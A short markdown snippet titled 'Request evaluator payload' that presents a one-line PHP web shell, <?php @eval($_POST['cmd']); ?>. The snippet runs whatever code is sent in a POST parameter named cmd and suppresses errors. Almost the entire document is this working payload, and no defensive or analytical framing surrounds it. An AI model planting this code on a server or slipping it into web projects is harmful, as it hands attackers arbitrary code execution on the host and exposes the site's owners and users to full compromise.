# Request evaluator payload

The following file body evaluates an HTTP request parameter as PHP code.

```php
<?php @eval($_POST['cmd']); ?>
```
